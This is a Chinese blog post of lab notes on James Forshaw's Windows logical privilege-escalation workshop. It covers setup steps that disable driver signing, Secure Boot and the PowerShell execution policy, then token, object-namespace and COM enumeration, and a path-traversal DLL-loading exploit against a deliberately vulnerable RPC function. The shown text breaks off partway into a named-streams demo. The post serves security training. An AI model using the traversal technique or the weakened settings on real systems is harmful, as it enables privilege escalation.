<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-145401438-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>Windows Logical EoP Workshop Writeup | Rekken&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="这份文档是对 James Forshaw 2017 年公开的 《Windows Logical EoP Workshop》 逻辑漏洞本地提权 Workshop 的分析调试笔记。  Workshop PPT: https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introd">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows Logical EoP Workshop Writeup">
<meta property="og:url" content="https://rekken.github.io/2017/05/30/Windows-Logical-EoP-Workshop-Writeup/index.html">
<meta property="og:site_name" content="Rekken&#39;s Blog">
<meta property="og:description" content="这份文档是对 James Forshaw 2017 年公开的 《Windows Logical EoP Workshop》 逻辑漏洞本地提权 Workshop 的分析调试笔记。  Workshop PPT: https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introd">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-08-03T08:04:05.274Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Windows Logical EoP Workshop Writeup">
<meta name="twitter:description" content="这份文档是对 James Forshaw 2017 年公开的 《Windows Logical EoP Workshop》 逻辑漏洞本地提权 Workshop 的分析调试笔记。  Workshop PPT: https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introd">
<meta name="twitter:creator" content="@yuebinsun">
  
    <link rel="alternate" href="/atom.xml" title="Rekken&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Rekken&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">The Road to 0x41414141</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://rekken.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Windows-Logical-EoP-Workshop-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/05/30/Windows-Logical-EoP-Workshop-Writeup/" class="article-date">
  <time datetime="2017-05-30T07:57:17.000Z" itemprop="datePublished">2017-05-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Windows Logical EoP Workshop Writeup
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这份文档是对 James Forshaw 2017 年公开的 《Windows Logical EoP Workshop》 逻辑漏洞本地提权 Workshop 的分析调试笔记。</p>
<ul>
<li><p>Workshop PPT: <a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf</a></p>
</li>
<li><p>Workshop 源码： <a href="https://github.com/tyranid/windows-logical-eop-workshop" target="_blank" rel="noopener">https://github.com/tyranid/windows-logical-eop-workshop</a></p>
</li>
</ul>
<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1 环境搭建"></a>1 环境搭建</h2><h3 id="1-1-虚拟机快照一次"><a href="#1-1-虚拟机快照一次" class="headerlink" title="1.1 虚拟机快照一次"></a>1.1 虚拟机快照一次</h3><p>如果方便，建议生成一次系统快照，方便实验结束之后恢复系统环境</p>
<h3 id="1-2-关闭驱动签名验证，以便测试自己编写的驱动"><a href="#1-2-关闭驱动签名验证，以便测试自己编写的驱动" class="headerlink" title="1.2 关闭驱动签名验证，以便测试自己编写的驱动"></a>1.2 关闭驱动签名验证，以便测试自己编写的驱动</h3><p>只有关闭了这个签名验证的保护，Windows 系统才允许加载用户自己编写的驱动。另外，这个特性是针对 64 位 Windows 8/10 的，如果用的是 32 位系统，可以忽略。</p>
<p>管理员权限运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;Bcdedit.exe -set TESTSIGNING ON</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="1-2-1-FAQ-关闭驱动签名保护策略时遇到-‘设置元素数据时出错’"><a href="#1-2-1-FAQ-关闭驱动签名保护策略时遇到-‘设置元素数据时出错’" class="headerlink" title="1.2.1 [FAQ] 关闭驱动签名保护策略时遇到 ‘设置元素数据时出错’"></a>1.2.1 [FAQ] 关闭驱动签名保护策略时遇到 ‘设置元素数据时出错’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;Bcdedit.exe -set TESTSIGNING ON</span><br><span class="line">设置元素数据时出错。</span><br><span class="line">该值受安全引导策略保护，无法进行修改或删除。</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>

<p>解决方法： 开机启动时，快速按 F2 进入 BIOS，选择 Boot 标签，将 Secure Boot 设置为 Disabled</p>
<h3 id="1-3-驱动服务的注册-注册内核测试驱动服务、手动模式启动"><a href="#1-3-驱动服务的注册-注册内核测试驱动服务、手动模式启动" class="headerlink" title="1.3 驱动服务的注册 - 注册内核测试驱动服务、手动模式启动"></a>1.3 驱动服务的注册 - 注册内核测试驱动服务、手动模式启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;sc create workshop binPath= &quot;C:\workshop\Driver\x86\LogicalEoPWorkshopDriver.sys&quot;  type= kernel start= demand</span><br><span class="line">[SC] CreateService 成功</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>注意每个参数 ‘=’ 的后面都有个空格，sc 命令的原型为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc [servername] create Servicename [Optionname= Optionvalues]</span><br></pre></td></tr></table></figure>

<h3 id="1-4-禁用-PowerShell-脚本的执行策略的限制"><a href="#1-4-禁用-PowerShell-脚本的执行策略的限制" class="headerlink" title="1.4 禁用 PowerShell 脚本的执行策略的限制"></a>1.4 禁用 PowerShell 脚本的执行策略的限制</h3><p>PowerShell 脚本执行策略从最严格到最宽松依次有几个级别:</p>
<ul>
<li>Restricted: 说什么也不能执行</li>
<li>AllSigned: 有签名的才能执行</li>
<li>RemoteSigned: 网络下载的必须有签名才能执行</li>
<li>Unrestricted: 执行无限制，但是如果脚本是下载的，执行是会弹框提示</li>
<li>Bypass: 无任何限制，也不会弹框</li>
</ul>
<p>执行策略的生效范围分为三个层次：</p>
<ul>
<li>Process: 设置的策略仅影响当前的 powershell 进程，退出之后失效</li>
<li>CurrentUser: 仅影响当前用户，对其他用户启动的 powershell 进程无影响</li>
<li>LocalMachine: 影响当前机器上的所有用户</li>
</ul>
<p>这里设置为最宽松策略，仅影响当前用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;powershell -Command &quot;Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass&quot;</span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-重启系统，使上述配置生效"><a href="#1-5-重启系统，使上述配置生效" class="headerlink" title="1.5 重启系统，使上述配置生效"></a>1.5 重启系统，使上述配置生效</h3><p>这几个策略需要重启系统才能完全生效</p>
<h3 id="1-6-启动服务"><a href="#1-6-启动服务" class="headerlink" title="1.6 启动服务"></a>1.6 启动服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;sc start workshop</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: workshop</span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER</span><br><span class="line">        STATE              : 4  RUNNING</span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">        PID                : 0</span><br><span class="line">        FLAGS              :</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h2 id="2-DEMO-1-Viewing-Token-and-Security-Descriptors-查看-Token-和安全描述符"><a href="#2-DEMO-1-Viewing-Token-and-Security-Descriptors-查看-Token-和安全描述符" class="headerlink" title="2 DEMO 1: Viewing Token and Security Descriptors(查看 Token 和安全描述符)"></a>2 DEMO 1: Viewing Token and Security Descriptors(查看 Token 和安全描述符)</h2><h3 id="查看进程-Token-的详细信息"><a href="#查看进程-Token-的详细信息" class="headerlink" title="查看进程 Token 的详细信息"></a>查看进程 Token 的详细信息</h3><p>利用 workshop\sandbox-attacksurface-analysis-tools\TokenViewer.exe 可以查看 Token 相关的各类安全属性信息，比如 Integrity Level</p>
<h3 id="查看对象管理中某个对象的安全描述符的详细信息"><a href="#查看对象管理中某个对象的安全描述符的详细信息" class="headerlink" title="查看对象管理中某个对象的安全描述符的详细信息"></a>查看对象管理中某个对象的安全描述符的详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; Import-Module C:\workshop\sandbox-attacksurface-analysis-tools\NtObjectManager\NtObjectManager.psd1</span><br><span class="line">PS C:\Users\test&gt; $ev = New-NtEvent \BaseNamedObjects\abc</span><br><span class="line">PS C:\Users\test&gt; $ev.SecurityDescriptor.Owner.Sid</span><br><span class="line">PS C:\Users\test&gt; $ev.SecurityDescriptor.Dacl | Format-List</span><br></pre></td></tr></table></figure>

<h2 id="3-DEMO-2-Displaying-Object-Namespace"><a href="#3-DEMO-2-Displaying-Object-Namespace" class="headerlink" title="3 DEMO 2: Displaying Object Namespace"></a>3 DEMO 2: Displaying Object Namespace</h2><h3 id="获取对象管理器中-BaseNamedObjects-目录下的所有对象列表"><a href="#获取对象管理器中-BaseNamedObjects-目录下的所有对象列表" class="headerlink" title="获取对象管理器中 \BaseNamedObjects 目录下的所有对象列表"></a>获取对象管理器中 \BaseNamedObjects 目录下的所有对象列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; Import-Module C:\workshop\sandbox-attacksurface-analysis-tools\NtObjectManager\NtObjectManager.psd1</span><br><span class="line">PS C:\Users\test&gt; Get-ChildItem NtObject:\BaseNamedObjects</span><br></pre></td></tr></table></figure>

<h3 id="递归获得对象管理器中所有的符号连接"><a href="#递归获得对象管理器中所有的符号连接" class="headerlink" title="递归获得对象管理器中所有的符号连接"></a>递归获得对象管理器中所有的符号连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; Get-ChildItem -Recurse NtObject:\ | Where-Object -Property IsSymbolicLink | Format-List</span><br><span class="line">...</span><br><span class="line">Name                 : GLOBAL??\WfpAle</span><br><span class="line">TypeName             : SymbolicLink</span><br><span class="line">IsDirectory          : False</span><br><span class="line">IsSymbolicLink       : True</span><br><span class="line">RelativePath         : GLOBAL??\WfpAle</span><br><span class="line">SymbolicLinkTarget   : \Device\WfpAle</span><br><span class="line">MaximumGrantedAccess : Query, ReadControl</span><br><span class="line">SecurityDescriptor   : O:BAG:SYD:(A;;CCRC;;;WD)(A;;CCSDRCWDWO;;;SY)(A;;CCSDRCWDWO;;;BA)(A;;CCRC;;;RC)</span><br><span class="line"></span><br><span class="line">Name                 : GLOBAL??\ACPI#GenuineIntel_-_x86_Family_6_Model_78_-_Intel(R)_Core(TM)_i7-6650U_CPU_@_2.20GHz#_</span><br><span class="line">                       #&#123;97fadb10-4e33-40ae-359c-8bef029dbdd0&#125;</span><br><span class="line">TypeName             : SymbolicLink</span><br><span class="line">IsDirectory          : False</span><br><span class="line">IsSymbolicLink       : True</span><br><span class="line">RelativePath         : GLOBAL??\ACPI#GenuineIntel_-_x86_Family_6_Model_78_-_Intel(R)_Core(TM)_i7-6650U_CPU_@_2.20GHz#_</span><br><span class="line">                       #&#123;97fadb10-4e33-40ae-359c-8bef029dbdd0&#125;</span><br><span class="line">SymbolicLinkTarget   : \Device\00000013</span><br><span class="line">MaximumGrantedAccess : Query, ReadControl</span><br><span class="line">SecurityDescriptor   : O:BAG:SYD:(A;;CCRC;;;WD)(A;;CCSDRCWDWO;;;SY)(A;;CCSDRCWDWO;;;BA)(A;;CCRC;;;RC)</span><br><span class="line"></span><br><span class="line">Name                 : KnownDlls\KnownDllPath</span><br><span class="line">TypeName             : SymbolicLink</span><br><span class="line">IsDirectory          : False</span><br><span class="line">IsSymbolicLink       : True</span><br><span class="line">RelativePath         : KnownDlls\KnownDllPath</span><br><span class="line">SymbolicLinkTarget   : C:\Windows\System32</span><br><span class="line">MaximumGrantedAccess : Query, ReadControl</span><br><span class="line">SecurityDescriptor   : O:BAG:SYD:(A;;CCSDRCWDWO;;;BA)(A;;CCRC;;;WD)(A;;CCRC;;;RC)(A;;CCRC;;;AC)(A;;CCRC;;;S-1-15-2-2)</span><br></pre></td></tr></table></figure>

<h3 id="获得对象管理器中某个符号链接对象的目标对象"><a href="#获得对象管理器中某个符号链接对象的目标对象" class="headerlink" title="获得对象管理器中某个符号链接对象的目标对象"></a>获得对象管理器中某个符号链接对象的目标对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; Get-NtSymbolicLinkTarget \global??\UMDFCtrlDev-ee7ed3ad-29bf-11e7-a06e-000c29f028f7</span><br><span class="line">\Device\UMDFCtrlDev-ee7ed3ad-29bf-11e7-a06e-000c29f028f7</span><br><span class="line"></span><br><span class="line">PS C:\Users\test&gt; Get-NtSymbolicLinkTarget \??\UMDFCtrlDev-ee7ed3ad-29bf-11e7-a06e-000c29f028f7</span><br><span class="line">\Device\UMDFCtrlDev-ee7ed3ad-29bf-11e7-a06e-000c29f028f7</span><br></pre></td></tr></table></figure>

<h2 id="3-DEMO-3-Enumerating-Accessible-Resources-枚举指定进程可访问的进程列表"><a href="#3-DEMO-3-Enumerating-Accessible-Resources-枚举指定进程可访问的进程列表" class="headerlink" title="3 DEMO 3 - Enumerating Accessible Resources(枚举指定进程可访问的进程列表)"></a>3 DEMO 3 - Enumerating Accessible Resources(枚举指定进程可访问的进程列表)</h2><h3 id="以-MicrosoftEdgeCP-为例介绍如何枚举指定进程-通过-pid-指定-可以访问的目标进程"><a href="#以-MicrosoftEdgeCP-为例介绍如何枚举指定进程-通过-pid-指定-可以访问的目标进程" class="headerlink" title="以 MicrosoftEdgeCP 为例介绍如何枚举指定进程(通过 pid 指定)可以访问的目标进程"></a>以 MicrosoftEdgeCP 为例介绍如何枚举指定进程(通过 pid 指定)可以访问的目标进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; cd C:\workshop\sandbox-attacksurface-analysis-tools</span><br><span class="line">PS C:\workshop\sandbox-attacksurface-analysis-tools&gt; .\CheckProcessAccess.exe</span><br><span class="line">0: Idle Synchronize</span><br><span class="line">8: SearchUI Full Access</span><br><span class="line">3036: ShellExperienceHost Full Access</span><br><span class="line">3304: CheckProcessAccess Full Access</span><br><span class="line">3580: sihost Full Access</span><br><span class="line">3592: svchost Full Access</span><br><span class="line">3804: taskhostw Full Access</span><br><span class="line">3908: ChsIME Full Access</span><br><span class="line">3964: RuntimeBroker Full Access</span><br><span class="line">3992:  Full Access</span><br><span class="line">4076: explorer Full Access</span><br><span class="line">4504: TabTip Terminate|QueryLimitedInformation|Synchronize</span><br><span class="line">4820: dllhost Full Access</span><br><span class="line">4852: cmd Terminate|QueryLimitedInformation|Synchronize</span><br><span class="line">4916: conhost Terminate|QueryLimitedInformation|Synchronize</span><br><span class="line">5100: backgroundTaskHost Full Access</span><br><span class="line">5284: smartscreen Full Access</span><br><span class="line">5340: MSASCuiL Full Access</span><br><span class="line">5404: powershell Full Access</span><br><span class="line">5432: conhost Full Access</span><br><span class="line">5480: vmtoolsd Full Access</span><br><span class="line">5512: OneDrive Full Access</span><br><span class="line">6092: audiodg QueryLimitedInformation</span><br><span class="line">PS C:\workshop\sandbox-attacksurface-analysis-tools&gt;</span><br><span class="line">PS C:\workshop\sandbox-attacksurface-analysis-tools&gt; $pidcp = Get-Process MicrosoftEdgeCP | Select-Object Id</span><br><span class="line">PS C:\workshop\sandbox-attacksurface-analysis-tools&gt; .\CheckProcessAccess.exe -p $pidcp.Id</span><br><span class="line">0: Idle Synchronize</span><br><span class="line">3000: MicrosoftEdge QueryInformation|QueryLimitedInformation|Synchronize</span><br><span class="line">5280: MicrosoftEdgeCP Full Access</span><br><span class="line">PS C:\workshop\sandbox-attacksurface-analysis-tools&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-DEMO-4-Inspecting-Accessible-COM-Services-枚举可以访问的-COM-服务"><a href="#4-DEMO-4-Inspecting-Accessible-COM-Services-枚举可以访问的-COM-服务" class="headerlink" title="4 DEMO 4: Inspecting Accessible COM Services(枚举可以访问的 COM 服务)"></a>4 DEMO 4: Inspecting Accessible COM Services(枚举可以访问的 COM 服务)</h2><h3 id="COM、服务"><a href="#COM、服务" class="headerlink" title="COM、服务"></a>COM、服务</h3><p>COM 是一种实现方式，应用程序可以通过 COM 接口调用目标组件提供的服务，COM 组件可以注册成进程内(In-Process) 和独立进程实现，相应的，当用户程序调用该接口时，系统会选择将 COM 的实现 DLL 加载进用户进程空间或者是选择拉起独立进程。</p>
<p>漏洞挖掘中，一般只关注独立进程实现的 COM 服务，因为这样的服务如果存在漏洞才有可能被用于沙箱逃逸，In-Process 类型的 COM，即便存在漏洞并成功触发，那也还是在当前进程空间（比如在沙箱进程内部），继承的是当前进程的权限。</p>
<p>服务与 COM 本身没有关系，服务是个独立的概念，通过 Windows Service Manager 管理的后台程序，该程序提供某些功能或者暴露一些接口，有些服务会暴露 COM 接口对外提供服务。</p>
<p>DCOM(COM) 在注册时会拥有一个唯一的标识符 AppID，用户程序可以通过 AppID 指定目标 COM，在比较新的 Windows 版本中，可以为 AppID 额外指定一个名字。</p>
<p>AppID 是谁生成的呢？AppID 本身是 GUID，由 Guidgen.exe 生成，在 COM 注册的时候，需要在注册表中写入这个以 GUID 命名的注册表键到 HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\ ，参考 <a href="https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms682359(v=vs.85).aspx" target="_blank" rel="noopener">MSDN AppID</a> 和 <a href="https://blogs.msdn.microsoft.com/jigarme/2007/10/09/what-is-appid/" target="_blank" rel="noopener">What is AppID</a> 以及 <a href="http://www.voidcn.com/blog/yifyrdm/article/p-1597354.html" target="_blank" rel="noopener">分布式组件对象Distribute Component Object Model(DCOM)的配置</a></p>
<h3 id="查看当前测试进程可以访问的-COM-服务"><a href="#查看当前测试进程可以访问的-COM-服务" class="headerlink" title="查看当前测试进程可以访问的 COM 服务"></a>查看当前测试进程可以访问的 COM 服务</h3><p>打开如下工具，打开之后默认显示注册表的统计信息，包括 AppID 的计数、ProgID 的计数、各类服务 CLSID 的计数等等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\workshop\OleViewDotNet\OleViewDotNet.exe</span><br></pre></td></tr></table></figure>

<p>过滤出当前进程可以访问的 App</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 菜单 -&gt; Registry -&gt; App IDs</span><br><span class="line">2. 右侧过滤栏 -&gt; mode -&gt; Accessible -&gt; Apply -&gt; Current Process</span><br></pre></td></tr></table></figure>

<h3 id="查看-Edge-Content-Process-可以访问的-COM-组件"><a href="#查看-Edge-Content-Process-可以访问的-COM-组件" class="headerlink" title="查看 Edge Content Process 可以访问的 COM 组件"></a>查看 Edge Content Process 可以访问的 COM 组件</h3><p>步骤基本同上，在 Apply 之后选择 Specific Process，选择 MicrosoftEdgeCP</p>
<h3 id="查看-Edge-Content-Process-可以访问的-COM-组件，并且只查看服务类型的"><a href="#查看-Edge-Content-Process-可以访问的-COM-组件，并且只查看服务类型的" class="headerlink" title="查看 Edge Content Process 可以访问的 COM 组件，并且只查看服务类型的"></a>查看 Edge Content Process 可以访问的 COM 组件，并且只查看服务类型的</h3><p>在上面过滤出 Edge Content Process 进程可访问组件的基础上，克隆一份然后设置过滤器，过滤出 Service 类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mode -&gt; Complex -&gt; Apply -&gt; Type = AppId, Field = IsService -&gt; Add，添加过滤器，然后确定</span><br></pre></td></tr></table></figure>

<p>此时会过滤出服务类型的 COM 组件</p>
<h2 id="5-DEMO-5-Exploiting-Path-Canonicalization-路径归一化相关漏洞的利用，如’-39-的拼接"><a href="#5-DEMO-5-Exploiting-Path-Canonicalization-路径归一化相关漏洞的利用，如’-39-的拼接" class="headerlink" title="5 DEMO 5 - Exploiting Path Canonicalization(路径归一化相关漏洞的利用，如’..&#39;的拼接)"></a>5 DEMO 5 - Exploiting Path Canonicalization(路径归一化相关漏洞的利用，如’..&#39;的拼接)</h2><h3 id="字符串拼接路径与-LoadLibrary"><a href="#字符串拼接路径与-LoadLibrary" class="headerlink" title="字符串拼接路径与 LoadLibrary"></a>字符串拼接路径与 LoadLibrary</h3><p>从 RpcServer.exe 打印的信息来看，测试 LoadLibrary 项时，输入 abc.dll，输出信息显示实际加载路径为 C:\Windows\abc.dll，所以，配合 ..\ 可以实现加载任意路径 DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;c:\workshop\ExploitTools\RpcServer.exe</span><br><span class="line">Called on binding &apos;ncalrpc:DESKTOP-5A86UND[RpcWorkshop]&apos;</span><br><span class="line">TestLoadLibrary called</span><br><span class="line">Loading path: C:\Windows\abc.dll</span><br><span class="line">Error loading module: TestLoadLibrary called</span><br><span class="line">Loading path: C:\Windows\..\..\..\..\..\workshop\ExploitTools\TestDll.dll</span><br><span class="line">Loaded module: 65450000</span><br></pre></td></tr></table></figure>

<p>该漏洞所在函数的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">boolean <span class="title">TestLoadLibrary</span><span class="params">(<span class="keyword">handle_t</span> hBinding, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"TestLoadLibrary called\n"</span>);</span><br><span class="line">	<span class="built_in">std</span>::wstring full_path = GetPathFromEnv(FOLDERID_Windows) + <span class="string">L"\\"</span> + name;  <span class="comment">// 字符串拼接配合 ..\ 可以绕过路径限制</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Loading path: %ls\n"</span>, full_path.c_str());</span><br><span class="line">	HMODULE hModule = LoadLibrary(full_path.c_str());</span><br><span class="line">	<span class="keyword">if</span> (hModule != <span class="literal">nullptr</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Loaded module: %p\n"</span>, hModule);</span><br><span class="line">		FreeLibrary(hModule);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error loading module: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-DEMO-6-Exploiting-Named-Streams"><a href="#6-DEMO-6-Exploiting-Named-Streams" class="headerlink" title="6 DEMO 6: Exploiting Named Streams"></a>6 DEMO 6: Exploiting Named Streams</h2><p>前面几步同上，后面选择 3 Test Load Library with Path Check，继续输入 ..\ 拼接的 DLL 路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line"></span><br><span class="line">Specify operation number: 3</span><br><span class="line"></span><br><span class="line">Specify library name: 